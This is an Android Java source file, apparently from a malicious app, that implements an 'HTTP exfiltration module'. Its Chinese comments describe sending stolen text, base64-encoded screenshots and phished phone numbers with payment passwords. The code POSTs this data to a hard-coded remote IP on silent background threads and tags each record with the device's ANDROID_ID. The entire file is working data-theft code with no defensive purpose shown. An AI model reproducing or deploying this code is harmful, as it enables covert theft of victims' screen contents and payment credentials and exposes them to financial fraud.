package com.attacker.xiaobu;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

/**
 * HTTP数据外泄模块
 * 将窃取的文本、截图(base64)和钓鱼凭证POST到远程服务器
 *
 * INTERNET 是 Normal Permission，安装时自动授予，不弹提示
 */
public class HttpExfil {
    private static final String TAG = "HttpExfil";
    private static final String SERVER = "http://192.144.228.237:8080";
    private static String sDeviceId = null;

    /**
     * 获取设备ID（无需任何权限）
     */
    private static String getDeviceId(Context ctx) {
        if (sDeviceId == null) {
            try {
                sDeviceId = Settings.Secure.getString(
                    ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            } catch (Exception e) {
                sDeviceId = "unknown";
            }
        }
        return sDeviceId;
    }

    /**
     * 外泄文本数据
     */
    public static void sendText(Context ctx, String payload, String capturedText) {
        try {
            org.json.JSONObject json = new org.json.JSONObject();
            json.put("device_id", getDeviceId(ctx));
            json.put("timestamp", new java.text.SimpleDateFormat(
                "yyyy-MM-dd'T'HH:mm:ss.SSSZ").format(new java.util.Date()));
            json.put("payload_type", "text");
            json.put("payload", payload);
            json.put("content", capturedText);

            doPost("/exfil", json);
        } catch (Exception e) {
            Log.e(TAG, "sendText error: " + e.getMessage());
        }
    }

    /**
     * 外泄截图（base64编码后发送）
     */
    public static void sendScreenshot(Context ctx, String payload, String filePath) {
        try {
            java.io.File f = new java.io.File(filePath);
            if (!f.exists()) return;

            // 读取PNG并base64编码
            java.io.FileInputStream fis = new java.io.FileInputStream(f);
            byte[] imgBytes = new byte[(int) f.length()];
            fis.read(imgBytes);
            fis.close();
            String b64 = android.util.Base64.encodeToString(imgBytes, android.util.Base64.NO_WRAP);

            org.json.JSONObject json = new org.json.JSONObject();
            json.put("device_id", getDeviceId(ctx));
            json.put("timestamp", new java.text.SimpleDateFormat(
                "yyyy-MM-dd'T'HH:mm:ss.SSSZ").format(new java.util.Date()));
            json.put("payload_type", "screenshot");
            json.put("payload", payload);
            json.put("filename", f.getName());
            json.put("screenshot_base64", b64);
            json.put("screenshot_size", f.length());

            doPost("/exfil", json);
        } catch (Exception e) {
            Log.e(TAG, "sendScreenshot error: " + e.getMessage());
        }
    }

    /**
     * 外泄钓鱼凭证（手机号+支付密码）
     */
    public static void sendPhish(Context ctx, String phone, String password, String deeplinkUri) {
        try {
            org.json.JSONObject json = new org.json.JSONObject();
            json.put("device_id", getDeviceId(ctx));
            json.put("timestamp", new java.text.SimpleDateFormat(
                "yyyy-MM-dd'T'HH:mm:ss.SSSZ").format(new java.util.Date()));
            json.put("payload_type", "phish");
            json.put("phone", phone);
            json.put("password", password);
            if (deeplinkUri != null) {
                json.put("deeplink_uri", deeplinkUri);
            }

            doPost("/phish", json);
        } catch (Exception e) {
            Log.e(TAG, "sendPhish error: " + e.getMessage());
        }
    }

    /**
     * 异步HTTP POST
     * 在后台线程执行，不阻塞主线程，失败静默
     */
    private static void doPost(String endpoint, org.json.JSONObject json) {
        final String url = SERVER + endpoint;
        final String body = json.toString();

        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                Log.i(TAG, "POST " + endpoint + " (" + body.length() + "B)");
                URL u = new URL(url);
                conn = (HttpURLConnection) u.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                conn.setDoOutput(true);
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);

                OutputStream os = conn.getOutputStream();
                os.write(body.getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                int code = conn.getResponseCode();
                Log.i(TAG, "→ " + code + " " + endpoint);
            } catch (Exception e) {
                Log.w(TAG, "POST failed (" + endpoint + "): " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        }, "exfil-thread").start();
    }
}
